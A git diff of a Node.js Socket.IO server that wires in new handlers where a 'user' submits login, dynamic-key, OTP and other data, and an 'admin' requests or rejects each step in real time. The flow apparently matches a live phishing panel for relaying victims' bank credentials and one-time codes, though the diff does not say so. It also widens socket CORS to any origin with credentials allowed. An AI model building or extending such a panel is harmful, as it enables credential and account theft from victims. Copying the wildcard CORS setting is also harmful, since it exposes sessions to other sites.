@@ -32,10 +32,14 @@ import { AdminController } from "./adapters/inbound/http/controllers/AdminContro
 import { buildRoutes } from "./adapters/inbound/http/routes.js";
 import { GetSession } from "./core/application/usecases/GetSession.js";
 import { UserGetSession } from "./core/application/usecases/UserGetSession.js";
+import { UserSubmitData } from "./core/application/usecases/UserSubmitData.js";
+import { AdminRequestData } from "./core/application/usecases/AdminRequestData.js";
+import { AdminRejectData } from "./core/application/usecases/AdminRejectData.js";
+import { AdminRequestAuth } from "./core/application/usecases/AdminRequestAuth.js";
 
 const PORT = Number(process.env.PORT || 3005);
-const ORIGIN1 = process.env.LARAVEL_ORIGIN1 || "http://192.168.1.4:8000";
-const ORIGIN2 = process.env.LARAVEL_ORIGIN2 || "http://192.168.1.4:8001";
+const ORIGIN1 = process.env.LARAVEL_ORIGIN1 || "http://192.168.1.26:8000";
+const ORIGIN2 = process.env.LARAVEL_ORIGIN2 || "http://192.168.1.26:8001";
 
 const app = express();
 app.use(express.json());
@@ -45,7 +49,7 @@ app.use(cors({ origin: "*", credentials: true }));
 
 const httpServer = http.createServer(app);
 const io = new Server(httpServer, {
-  cors: { origin: [ORIGIN1, ORIGIN2], credentials: true },
+  cors: { origin: "*", credentials: true },
 });
 
 // ---- Outbound adapters
@@ -66,13 +70,17 @@ const issueAdminToken = new IssueAdminToken(
 /* admin */
 
 const adminBootstrap = new AdminBootstrap(repo, rt);
+const requestAuth = new AdminRequestAuth(repo, rt);
 const rejectAuth = new AdminRejectAuth(repo, rt);
+const requestData = new AdminRequestData(repo, rt);
+const rejectData = new AdminRejectData(repo, rt);
 const requestDinamic = new AdminRequestDinamic(repo, rt);
 const rejectDinamic = new AdminRejectDinamic(repo, rt);
 const requestOtp = new AdminRequestOtp(repo, rt);
 const rejectOtp = new AdminRejectOtp(repo, rt);
 
 /* user */
+const submitData = new UserSubmitData(repo, rt);
 const submitAuth = new UserSubmitAuth(repo, rt);
 const submitDinamic = new UserSubmitDinamic(repo, rt);
 const submitOtp = new UserSubmitOtp(repo, rt);
@@ -101,6 +109,9 @@ io.on("connection", async (socket) => {
     await adminBootstrap.execute({ socketId: socket.id, limit: 200 });
 
     registerAdminHandlers(socket, {
+      requestData,
+      rejectData,
+      requestAuth,
       rejectAuth,
       requestDinamic,
       rejectDinamic,
@@ -112,7 +123,7 @@ io.on("connection", async (socket) => {
   if (auth.role === "user") {
     const sessionId = auth.sessionId;
     socket.join(`session:${sessionId}`);
-    registerUserHandlers(socket, { submitAuth, submitDinamic, submitOtp, userGetSession });
+    registerUserHandlers(socket, { submitAuth, submitDinamic, submitOtp, userGetSession, submitData });
   }
 });
 
